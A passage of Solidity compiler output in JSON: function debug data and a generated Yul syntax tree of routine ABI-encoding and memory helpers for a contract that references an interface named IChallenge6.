code_tuple_t_contract$_IChallenge6_$5824__to_t_address__fromStack_reversed":{"entryPoint":917,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":756,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":1159,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":612,"id":null,"parameterSlots":1,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":623,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":790,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":1045,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_contract$_IChallenge6_$5824_to_t_address":{"entryPoint":884,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_uint160_to_t_address":{"entryPoint":866,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_uint160_to_t_uint160":{"entryPoint":832,"id":null,"parameterSlots":1,"returnSlots":1},"copy_memory_to_memory_with_cleanup":{"entryPoint":640,"id":null,"parameterSlots":3,"returnSlots":0},"extract_byte_array_length":{"entryPoint":991,"id":null,"parameterSlots":1,"returnSlots":1},"identity":{"entryPoint":822,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x22":{"entryPoint":944,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":1040,"id":null,"parameterSlots":0,"returnSlots":0},"round_up_to_mul_of_32":{"entryPoint":682,"id":null,"parameterSlots":1,"returnSlots":1},"validator_revert_t_uint256":{"entryPoint":1055,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:4331:14","nodeType":"YulBlock","src":"0:4331:14","statements":[{"body":{"nativeSrc":"66:40:14","nodeType":"YulBlock","src":"66:40:14","statements":[{"nativeSrc":"77:22:14","nodeType":"YulAssignment","src":"77:22:14","value":{"arguments":[{"name":"value","nativeSrc":"93:5:14","nodeType":"YulIdentifier","src":"93:5:14"}],"functionName":{"name":"mload","nativeSrc":"87:5:14","nodeType":"YulIdentifier","src":"87:5:14"},"nativeSrc":"87:12:14","nodeType":"YulFunctionCall","src":"87:12:14"},"variableNames":[{"name":"length","nativeSrc":"77:6:14","nodeType":"YulIdentifier","src":"77:6:14"}]}]},"name":"array_length_t_string_memory_ptr","nativeSrc":"7:99:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"49:5:14","nodeType":"YulTypedName","src":"49:5:14","type":""}],"returnVariables":[{"name":"length","nativeSrc":"59:6:14","nodeType":"YulTypedName","src":"59:6:14","type":""}],"src":"7:99:14"},{"body":{"nativeSrc":"208:73:14","nodeType":"YulBlock","src":"208:73:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"225:3:14","nodeType":"YulIdentifier","src":"225:3:14"},{"name":"length","nativeSrc":"230:6:14","nodeType":"YulIdentifier","src":"230:6:14"}],"functionName":{"name":"mstore","nativeSrc":"218:6:14","nodeType":"YulIdentifier","src":"218:6:14"},"nativeSrc":"218:19:14","nodeType":"YulFunctionCall","src":"218:19:14"},"nativeSrc":"218:19:14","nodeType":"YulExpressionStatement","src":"218:19:14"},{"nativeSrc":"246:29:14","nodeType":"YulAssignment","src":"246:29:14","value":{"arguments":[{"name":"pos","nativeSrc":"265:3:14","nodeType":"YulIdentifier","src":"265:3:14"},{"kind":"number","nativeSrc":"270:4:14","nodeType":"YulLiteral","src":"270:4:14","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"261:3:14","nodeType":"YulIdentifier","src":"261:3:14"},"nativeSrc":"261:14:14","nodeType":"YulFunctionCall","src":"261:14:14"},"variableNames":[{"name":"updated_pos","nativeSrc":"246:11:14","nodeType":"YulIdentifier","src":"246:11:14"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"112:169:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"180:3:14","nodeType":"YulTypedName","src":"180:3:14","type":""},{"name":"length","nativeSrc":"185:6:14","nodeType":"YulTypedName","src":"185:6:14","type":""}],"returnVariables":[{"name":"updated_pos","nativeSrc":"196:11:14","nodeType":"YulTypedName","src":"196:11:14","type":""}],"src":"112:169:14"},{"body":{"nativeSrc":"349:186:14","nodeType":"YulBlock","src":"349:186:14","statements":[{"nativeSrc":"360:10:14","nodeType":"YulVariableDeclaration","src":"360:10:14","value":{"kind":"number","nativeSrc":"369:1:14","nodeType":"YulLiteral","src":"369:1:14","type":"","value":"0"},"variables":[{"name":"i","nativeSrc":"364:1:14","nodeType":"YulTypedName","src":"364:1:14","type":""}]},{"body":{"nativeSrc":"429:63:14","nodeType":"YulBlock","src":"429:63:14","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nativeSrc":"454:3:14","nodeType":"YulIdentifier","src":"454:3:14"},{"name":"i","nativeSrc":"459:1:14","nodeType":"YulIdentifier","src":"459:1:14"}],"functionName":{"name":"add","nativeSrc":"450:3:14","nodeType":"YulIdentifier","src":"450:3:14"},"nativeSrc":"450:11:14","nodeType":"YulFunctionCall","src":"450:11:14"},{"arguments":[{"arguments":[{"name":"src","nativeSrc":"473:3:14","nodeType":"YulIdentifier","src":"473:3:14"},{"name":"i","nativeSrc":"478:1:14","nodeType":"YulIdentifier","src":"478:1:14"}],"functionName":{"name":"add","nativeSrc":"469:3:14","nodeType":"YulIdentifier","src":"469:3:14"},"nativeSrc":"469:11:14","nodeType":"YulFunctionCall","src":"469:11:14"}],"functionName":{"name":"mload","nativeSrc":"463:5:14","nodeType":"YulIdentifier","src":"463:5:14"},"nativeSrc":"463:18:14","nodeType":"YulFunctionCall","src":"463:18:14"}],"functionName":{"name":"mstore","nativeSrc":"443:6:14","nodeType":"YulIdentifier","src":"443:6:14"},"nativeSrc":"443:39:14","nodeType":"YulFunctionCall","src":"443:39:14"},"nativeSrc":"443:39:14","nodeType":"YulExpressionStatement","src":"443:39:14"}]},"condition":{"arguments":[{"name":"i","nativeSrc":"390:1:14","nodeType":"YulIdentifier","src":"390:1:14"},{"name":"length","nativeSrc":"393:6:14","nodeType":"YulIdentifier","src":"393:6:14"}],"functionName":{"name":"lt","nativeSrc":"387:2:14","nodeType":"YulIdentifier","src":"387:2:14"},"nativeSrc":"387:13:14","nodeType":"YulFunctionCall","src":"387:13:14"},"nativeSrc":"379:113:14","nodeType":"YulForLoop","post":{"nativeSrc":"401:19:14","nodeType":"YulBlock","src":"401:19:14","statements":[{"nativeSrc":"403:15:14","nodeType":"YulAssignment","src":"403:15:14","value":{"arguments":[{"name":"i","nativeSrc":"412:1:14","nodeType":"YulIdentifier","src":"412:1:14"},{"kind":"number","nativeSrc":"415:2:14","nodeType":"YulLiteral","src":"415:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"408:3:14","nodeType":"YulIdentifier","src":"408:3:14"},"nativeSrc":"408:10:14","nodeType":"YulFunctionCall","src":"408:10:14"},"variableNames":[{"name":"i","nativeSrc":"403:1:14","nodeType":"YulIdentifier","src":"403:1:14"}]}]},"pre":{"nativeSrc":"383:3:14","nodeType":"YulBlock","src":"383:3:14","statements":[]},"src":"379:113:14"},{"expression":{"arguments":[{"arguments":[{"name":"dst","nativeSrc":"512:3:14","nodeType":"YulIdentifier","src":"512:3:14"},{"name":"length","nativeSrc":"517:6:14","nodeType":"YulIdentifier","src":"517:6:14"}],"functionName":{"name":"add","nativeSrc":"508:3:14","nodeType":"YulIdentifier","src":"508:3:14"},"nativeSrc":"508:16:14","nodeType":"YulFunctionCall","src":"508:16:14"},{"kind":"number","nativeSrc":"526:1:14","nodeType":"YulLiteral","src":"526:1:14","type":"","value":"0"}],"functionName":{"name":"mstore","nativeSrc":"501:6:14","nodeType":"YulIdentifier","src":"501:6:14"},"nativeSrc":"501:27:14","nodeType":"YulFunctionCall","src":"501:27:14"},"nativeSrc":"501:27:14","nodeType":"YulExpressionStatement","src":"501:27:14"}]},"name":"copy_memory_to_memory_with_cleanup","nativeSrc":"287:248:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nativeSrc":"331:3:14","nodeType":"YulTypedName","src":"331:3:14","type":""},{"name":"dst","nativeSrc":"336:3:14","nodeType":"YulTypedName","src":"336:3:14","type":""},{"name":"length","nativeSrc":"341:6:14","nodeType":"YulTypedName","src":"341:6:14","type":""}],"src":"287:248:14"},{"body":{"nativeSrc":"589:54:14","nodeType":"YulBlock","src":"589:54:14","statements":[{"nativeSrc":"599:38:14","nodeType":"YulAssignment","src":"599:38:14","value":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"617:5:14","nodeType":"YulIdentifier","src":"617:5:14"},{"kind":"number","nativeSrc":"624:2:14","nodeType":"YulLiteral","src":"624:2:14","type":"","value":"31"}],"functionName":{"name":"add","nativeSrc":"613:3:14","nodeType":"YulIdentifier","src":"613:3:14"},"nativeSrc":"613:14:14","nodeType":"YulFunctionCall","src":"613:14:14"},{"arguments":[{"kind":"number","nativeSrc":"633:2:14","nodeType":"YulLiteral","src":"633:2:14","type":"","value":"31"}],"functionName":{"name":"not","nativeSrc":"629:3:14","nodeType":"YulIdentifier","src":"629:3:14"},"nativeSrc":"629:7:14","nodeType":"YulFunctionCall","src":"629:7:14"}],"functionName":{"name":"and","nativeSrc":"609:3:14","nodeType":"YulIdentifier","src":"609:3:14"},"nativeSrc":"609:28:14","nodeType":"YulFunctionCall","src":"609:28:14"},"variableNames":[{"name":"result","nativeSrc":"599:6:14","nodeType":"YulIdentifier","src":"599:6:14"}]}]},"name":"round_up_to_mul_of_32","nativeSrc":"541:102:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"572:5:14","nodeType":"YulTypedName","src":"572:5:14","type":""}],"returnVariables":[{"name":"result","nativeSrc":"582:6:14","nodeType":"YulTypedName","src":"582:6:14","type":""}],"src":"541:102:14"},{"body":{"nativeSrc":"741:285:14","nodeType":"YulBlock","src":"741:285:14","statements":[{"nativeSrc":"751:53:14","nodeType":"YulVariableDeclaration","src":"751:53:14","value":{"arguments":[{"name":"value","nativeSrc":"798:5:14","nodeType":"YulIdentifier","src":"798:5:14"}],"functionName":{"name":"array_length_t_string_memory_ptr","nativeSrc":"765:32:14","nodeType":"YulIdentifier","src":"765:32:14"},"nativeSrc":"765:39:14","nodeType":"YulFunctionCall","src":"765:39:14"},"variables":[{"name":"length","nativeSrc":"755:6:14","nodeType":"YulTypedName","src":"755:6:14","type":""}]},{"nativeSrc":"813:78:14","nodeType":"YulAssignment","src":"813:78:14","value":{"arguments":[{"name":"pos","nativeSrc":"879:3:14","nodeType":"YulIdentifier","src":"879:3:14"},{"name":"length","nativeSrc":"884:6:14","nodeType":"YulIdentifier","src":"884:6:14"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"820:58:14","nodeType":"YulIdentifier","src":"820:58:14"},"nativeSrc":"820:71:14","nodeType":"YulFunctionCall","src":"820:71:14"},"variableNames":[{"name":"pos","nativeSrc":"813:3:14","nodeType":"YulIdentifier","src":"813:3:14"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"939:5:14","nodeType":"YulIdentifier","src":"939:5:14"},{"kind":"number","nativeSrc":"946:4:14","nodeType":"YulLiteral","src":"946:4:14","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"935:3:14","nodeType":"YulIdentifier","src":"935:3:14"},"nativeSrc":"935:16:14","nodeType":"YulFunctionCall","src":"935:16:14"},{"name":"pos","nativeSrc":"953:3:14","nodeType":"YulIdentifier","src":"953:3:14"},{"name":"length","nativeSrc":"958:6:14","nodeType":"YulIdentifier","src":"958:6:14"}],"functionName":{"name":"copy_memory_to_memory_with_cleanup","nativeSrc":"900:34:14","nodeType":"YulIdentifier","src":"900:34:14"},"nativeSrc":"900:65:14","nodeType":"YulFunctionCall","src":"900:65:14"},"nativeSrc":"900:65:14","nodeType":"YulExpressionStatement","src":"900:65:14"},{"nativeSrc":"974:46:14","nodeType":"YulAssignment","src":"974:46:14","value":{"arguments":[{"name":"pos","nativeSrc":"985:3:14","nodeType":"YulIdentifier","src":"985:3:14"},{"arguments":[{"name":"length","nativeSrc":"1012:6:14","nodeType":"YulIdentifier","src":"1012:6:14"}],"functionName":{"name":"round_up_to_mul_of_32","nativeSrc":"990:21:14","nodeType":"YulIdentifier","src":"990:21:14"},"nativeSrc":"990:29:14","nodeType":"YulFunctionCall","src":"990:29:14"}],"functionName":{"name":"add","nativeSrc":"981:3:14","nodeType":"YulIdentifier","src":"981:3:14"},"nativeSrc":"981:39:14","nodeType":"YulFunctionCall","src":"981:39:14"},"variableNames":[{"name":"end","nativeSrc":"974:3:14","nodeType":"YulIdentifier","src":"974:3:14"}]}]},"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nativeSrc":"649:377:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"722:5:14","nodeType":"YulTypedName","src":"722:5:14","type":""},{"name":"pos","nativeSrc":"729:3:14","nodeType":"YulTypedName","src":"729:3:14","type":""}],"returnVariables":[{"name":"end","nativeSrc":"737:3:14","nodeType":"YulTypedName","src":"737:3:14","type":""}],"src":"649:377:14"},{"body":{"nativeSrc":"1150:195:14","nodeType":"YulBlock","src":"1150:195:14","statements":[{"nativeSrc":"1160:26:14","nodeType":"YulAssignment","src":"1160:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"1172:9:14","nodeType":"YulIdentifier","src":"1172:9:14"},{"kind":"number","nativeSrc":"1183:2:14","nodeType":"YulLiteral","src":"1183:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1168:3:14","nodeType":"YulIdentifier","src":"1168:3:14"},"nativeSrc":"1168:18:14","nodeType":"YulFunctionCall","src":"1168:18:14"},"variableNames":[{"name":"tail","nativeSrc":"1160:4:14","nodeType":"YulIdentifier","src":"1160:4:14"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1207:9:14","nodeType":"YulIdentifier","src":"1207:9:14"},{"kind":"number","nativeSrc":"1218:1:14","nodeType":"YulLiteral","src":"1218:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1203:3:14","nodeType":"YulIdentifier","src":"1203:3:14"},"nativeSrc":"1203:17:14","nodeType":"YulFunctionCall","src":"1203:17:14"},{"arguments":[{"name":"tail","nativeSrc":"1226:4:14","nodeType":"YulIdentifier","src":"1226:4:14"},{"name":"headStart","nativeSrc":"1232:9:14","nodeType":"YulIdentifier","src":"1232:9:14"}],"functionName":{"name":"sub","nativeSrc":"1222:3:14","nodeType":"YulIdentifier","src":"1222:3:14"},"nativeSrc":"1222:20:14","nodeType":"YulFunctionCall","src":"1222:20:14"}],"functionName":{"name":"mstore","nativeSrc":"1196:6:14","nodeType":"YulIdentifier","src":"1196:6:14"},"nativeSrc":"1196:47:14","nodeType":"YulFunctionCall","src":"1196:47:14"},"nativeSrc":"1196:47:14","nodeType":"YulExpressionStatement","src":"1196:47:14"},{"nativeSrc":"1252:86:14","nodeType":"YulAssignment","src":"1252:86:14","value":{"arguments":[{"name":"value0","nativeSrc":"1324:6:14","nodeType":"YulIdentifier","src":"1324:6:14"},{"name":"tail","nativeSrc":"1333:4:14","nodeType":"YulIdentifier","src":"1333:4:14"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nativeSrc":"1260:63:14","nodeType":"YulIdentifier","src":"1260:63:14"},"nativeSrc":"1260:78:14","nodeType":"YulFunctionCall","src":"1260:78:14"},"variableNames":[{"name":"tail","nativeSrc":"1252:4:14","nodeType":"YulIdentifier","src":"1252:4:14"}]}]},"name":"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed","nativeSrc":"1032:313:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1122:9:14","nodeType":"YulTypedName","src":"1122:9:14","type":""},{"name":"value0","nativeSrc":"1134:6:14","nodeType":"YulTypedName","src":"1134:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1145:4:14","nodeType":"YulTypedName","src":"1145:4:14","type":""}],"src":"1032:313:14"},{"body":{"nativeSrc":"1396:81:14","nodeType":"YulBlock","src":"1396:81:14","statements":[{"nativeSrc":"1406:65:14","nodeType":"YulAssignment","src":"1406:65:14","value":{"arguments":[{"name":"value","nativeSrc":"1421:5:14","nodeType":"YulIdentifier","src":"1421:5:14"},{"kind":"number","nativeSrc":"1428:42:14","nodeType":"YulLiteral","src":"1428:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"1417:3:14","nodeType":"YulIdentifier","src":"1417:3:14"},"nativeSrc":"1417:54:14","nodeType":"YulFunctionCall","src":"1417:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"1406:7:14","nodeType":"YulIdentifier","src":"1406:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"1351:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1378:5:14","nodeType":"YulTypedName","src":"1378:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1388:7:14","nodeType":"YulTypedName","src":"1388:7:14","type":""}],"src":"1351:126:14"},{"body":{"nativeSrc":"1515:28:14","nodeType":"YulBlock","src":"1515:28:14","statements":[{"nativeSrc":"1525:12:14","nodeType":"YulAssignment","src":"1525:12:14","value":{"name":"value","nativeSrc":"1532:5:14","nodeType":"YulIdentifier","src":"1532:5:14"},"variableNames":[{"name":"ret","nativeSrc":"1525:3:14","nodeType":"YulIdentifier","src":"1525:3:14"}]}]},"name":"identity","nativeSrc":"1483:60:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1501:5:14","nodeType":"YulTypedName","src":"1501:5:14","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"1511:3:14","nodeType":"YulTypedName","src":"1511:3:14","type":""}],"src":"1483:60:14"},{"body":{"nativeSrc":"1609:82:14","nodeType":"YulBlock","src":"1609:82:14","statements":[{"nativeSrc":"1619:66:14","nodeType":"YulAssignment","src":"1619:66:14","value":{"arguments":[{"arguments":[{"arguments":[{"name":"value","nativeSrc":"1677:5:14","nodeType":"YulIdentifier","src":"1677:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"1659:17:14","nodeType":"YulIdentifier","src":"1659:17:14"},"nativeSrc":"1659:24:14","nodeType":"YulFunctionCall","src":"1659:24:14"}],"functionName":{"name":"identity","nativeSrc":"1650:8:14","nodeType":"YulIdentifier","src":"1650:8:14"},"nativeSrc":"1650:34:14","nodeType":"YulFunctionCall","src":"1650:34:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"1632:17:14","nodeType":"YulIdentifier","src":"1632:17:14"},"nativeSrc":"1632:53:14","nodeType":"YulFunctionCall","src":"1632:53:14"},"variableNames":[{"name":"converted","nativeSrc":"1619:9:14","nodeType":"YulIdentifier","src":"1619:9:14"}]}]},"name":"convert_t_uint160_to_t_uint160","nativeSrc":"1549:142:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1589:5:14","nodeType":"YulTypedName","src":"1589:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"1599:9:14","nodeType":"YulTypedName","src":"1599:9:14","type":""}],"src":"1549:142:14"},{"body":{"nativeSrc":"1757:66:14","nodeType":"YulBlock","src":"1757:66:14","statements":[{"nativeSrc":"1767:50:14","nodeType":"YulAssignment","src":"1767:50:14","value":{"arguments":[{"name":"value","nativeSrc":"1811:5:14","nodeType":"YulIdentifier","src":"1811:5:14"}],"functionName":{"name":"convert_t_uint160_to_t_uint160","nativeSrc":"1780:30:14","nodeType":"YulIdentifier","src":"1780:30:14"},"nativeSrc":"1780:37:14","nodeType":"YulFunctionCall","src":"1780:37:14"},"variableNames":[{"name":"converted","nativeSrc":"1767:9:14","nodeType":"YulIdentifier","src":"1767:9:14"}]}]},"name":"convert_t_uint160_to_t_address","nativeSrc":"1697:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1737:5:14","nodeType":"YulTypedName","src":"1737:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"1747:9:14","nodeType":"YulTypedName","src":"1747:9:14","type":""}],"src":"1697:126:14"},{"body":{"nativeSrc":"1909:66:14","nodeType":"YulBlock","src":"1909:66:14","statements":[{"nativeSrc":"1919:50:14","nodeType":"YulAssignment","src":"1919:50:14","value":{"arguments":[{"name":"value","nativeSrc":"1963:5:14","nodeType":"YulIdentifier","src":"1963:5:14"}],"functionName":{"name":"convert_t_uint160_to_t_address","nativeSrc":"1932:30:14","nodeType":"YulIdentifier","src":"1932:30:14"},"nativeSrc":"1932:37:14","nodeType":"YulFunctionCall","src":"1932:37:14"},"variableNames":[{"name":"converted","nativeSrc":"1919:9:14","nodeType":"YulIdentifier","src":"1919:9:14"}]}]},"name":"convert_t_contract$_IChallenge6_$5824_to_t_address","nativeSrc":"1829:146:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1889:5:14","nodeType":"YulTypedName","src":"1889:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"1899:9:14","nodeType":"YulTypedName","src":"1899:9:14","type":""}],"src":"1829:146:14"},{"body":{"nativeSrc":"2066:86:14","nodeType":"YulBlock","src":"2066:86:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"2083:3:14","nodeType":"YulIdentifier","src":"2083:3:14"},{"arguments":[{"name":"value","nativeSrc":"2139:5:14","nodeType":"YulIdentifier","src":"2139:5:14"}],"functionName":{"name":"convert_t_contract$_IChallenge6_$5824_to_t_address","nativeSrc":"2088:50:14","nodeType":"YulIdentifier","src":"2088:50:14"},"nativeSrc":"2088:57:14","nodeType":"YulFunctionCall","src":"2088:57:14"}],"functionName":{"name":"mstore","nativeSrc":"2076:6:14","nodeType":"YulIdentifier","src":"2076:6:14"},"nativeSrc":"2076:70:14","nodeType":"YulFunctionCall","src":"2076:70:14"},"nativeSrc":"2076:70:14","nodeType":"YulExpressionStatement","src":"2076:70:14"}]},"name":"abi_encode_t_contract$_IChallenge6_$5824_to_t_address_fromStack","nativeSrc":"1981:171:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2054:5:14","nodeType":"YulTypedName","src":"2054:5:14","type":""},{"name":"pos","nativeSrc":"2061:3:14","nodeType":"YulTypedName","src":"2061:3:14","type":""}],"src":"1981:171:14"},{"body":{"nativeSrc":"2276:144:14","nodeType":"YulBlock","src":"2276:144:14","statements":[{"nativeSrc":"2286:26:14","nodeType":"YulAssignment","src":"2286:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"2298:9:14","nodeType":"YulIdentifier","src":"2298:9:14"},{"kind":"number","nativeSrc":"2309:2:14","nodeType":"YulLiteral","src":"2309:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"2294:3:14","nodeType":"YulIdentifier","src":"2294:3:14"},"nativeSrc":"2294:18:14","nodeType":"YulFunctionCall","src":"2294:18:14"},"variableNames":[{"name":"tail","nativeSrc":"2286:4:14","nodeType":"YulIdentifier","src":"2286:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"2386:6:14","nodeType":"YulIdentifier","src":"2386:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"2399:9:14","nodeType":"YulIdentifier","src":"2399:9:14"},{"kind":"number","nativeSrc":"2410:1:14","nodeType":"YulLiteral","src":"2410:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"2395:3:14","nodeType":"YulIdentifier","src":"2395:3:14"},"nativeSrc":"2395:17:14","nodeType":"YulFunctionCall","src":"2395:17:14"}],"functionName":{"name":"abi_encode_t_contract$_IChallenge6_$5824_to_t_address_fromStack","nativeSrc":"2322:63:14","nodeType":"YulIdentifier","src":"2322:63:14"},"nativeSrc":"2322:91:14","nodeType":"YulFunctionCall","src":"2322:91:14"},"nativeSrc":"2322:91:14","nodeType":"YulExpressionStatement","src":"2322:91:14"}]},"name":"abi_encode_tuple_t_contract$_IChallenge6_$5824__to_t_address__fromStack_reversed","nativeSrc":"2158:262:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"2248:9:14","nodeType":"YulTypedName","src":"2248:9:14","type":""},{"name":"value0","nativeSrc":"2260:6:14","nodeType":"YulTypedName","src":"2260:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"2271:4:14","nodeType":"YulTypedName","src":"2271:4:14","type":""}],"src":"2158:262:14"},{"body":{"nativeSrc":"2454:152:14","nodeType":"YulBlock","src":"2454:152:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2471:1:14","nodeType":"YulLiteral","src":"2471:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"2474:77:14","nodeType":"YulLiteral","src":"2474:77:14","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"2464:6:14","nodeType":"YulIdentifier","src":"2464:6:14"},"nativeSrc":"2464:88:14","nodeType":"YulFunctionCall","src":"2464:88:14"},"nativeSrc":"2464:88:14","nodeType":"YulExpressionStatement","src":"2464:88:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"2568:1:14","nodeType":"YulLiteral","src":"2568:1:14","type":"","value":"4"},{"kind":"number","nativeSrc":"2571:4:14","nodeType":"YulLiteral","src":"2571:4:14","type":"","value":"0x22"}],"functionName":{"name":"mstore","nativeSrc":"2561:6:14","nodeType":"YulIdentifier","src":"2561:6:14"},"nativeSrc":"2561:15:14","nodeType":"YulFunctionCall","src":"2561:15:14"},"nativeSrc":"2561:15:14","nodeType":"YulExpressionStatement","src":"2561:15:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"2592:1:14","nodeType":"YulLiteral","src":"2592:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"2595:4:14","nodeType":"YulLiteral","src":"2595:4:14","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"2585:6:14","nodeType":"YulIdentifier","src":"2585:6:14"},"nativeSrc":"2585:15:14","nodeType":"YulFunctionCall","src":"2585:15:14"},"nativeSrc":"2585:15:14","nodeType":"YulExpressionStatement","src":"2585:15:14"}]},"name":"panic_error_0x22","nativeSrc":"2426:180:14","nodeType":"YulFunctionDefinition","src":"2426:180:14"},{"body":{"nativeSrc":"2663:269:14","nodeType":"YulBlock","src":"2663:269:14","statements":[{"nativeSrc":"2673:22:14","nodeType":"YulAssignment","src":"2673:22:14","value":{"arguments":[{"name":"data","nativeSrc":"2687:4:14","nodeType":"YulIdentifier","src":"2687:4:14"},{"kind":"number","nativeSrc":"2693:1:14","nodeType":"YulLiteral","src":"2693:1:14","type":"","value":"2"}],"functionName":{"name":"div","nativeSrc":"2683:3:14","nodeType":"YulIdentifier","src":"2683:3:14"},"nativeSrc":"2683:12:14","nodeType":"YulFunctionCall","src":"2683:12:14"},"variableNames":[{"name":"length","nativeSrc":"2673:6:14","nodeType":"YulIdentifier","src":"2673:6:14"}]},{"nativeSrc":"2704:38:14","nodeType":"YulVariableDeclaration","src":"2704:38:14","value":{"arguments":[{"name":"data","nativeSrc":"2734:4:14","nodeType":"YulIdentifier","src":"2734:4:14"},{"kind":"number","nativeSrc":"2740:1:14","nodeType":"YulLiteral","src":"2740:1:14","type":"","value":"1"}],"functionName":{"name":"and","nativeSrc":"2730:3:14","nodeType":"YulIdentifier","src":"2730:3:14"},"nativeSrc":"2730:12:14","nodeType":"YulFunctionCall","src":"2730:12:14"},"variables":[{"name":"outOfPlaceEncoding","nativeSrc":"2708:18:14","nodeType":"YulTypedName","src":"2708:18:14","type":""}]},{"body":{"nativeSrc":"2781:51:14","nodeType":"YulBlock","src":"2781:51:14","statements":[{"nativeSrc":"2795:27:14","nodeType":"YulAssignment","src":"2795:27:14","value":{"arguments":[{"name":"length","nativeSrc":"2809:6:14","nodeType":"YulIdentifier","src":"2809:6:14"},{"kind":"number","nativeSrc":"2817:4:14","nodeType":"YulLiteral","src":"2817:4:14","type":"","value":"0x7f"}],"functionName":{"name":"and","nativeSrc":"2805:3:14","nodeType":"YulIdentifier","src":"2805:3:14"},"nativeSrc":"2805:17:14","nodeType":"YulFunctionCall","src":"2805:17:14"},"variableNames":[{"name":"length","nativeSrc":"2795:6:14","nodeType":"YulIdentifier","src":"2795:6:14"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"2761:18:14","nodeType":"YulIdentifier","src":"2761:18:14"}],"functionName":{"name":"iszero","nativeSrc":"2754:6:14","nodeType":"YulIdentifier","src":"2754:6:14"},"nativeSrc":"2754:26:14","nodeType":"YulFunctionCall","src":"2754:26:14"},"nativeSrc":"2751:81:14","nodeType":"YulIf","src":"2751:81:14"},{"body":{"nativeSrc":"2884:42:14","nodeType":"YulBlock","src":"2884:42:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nativeSrc":"2898:16:14","nodeType":"YulIdentifier","src":"2898:16:14"},"nativeSrc":"2898:18:14","nodeType":"YulFunctionCall","src":"289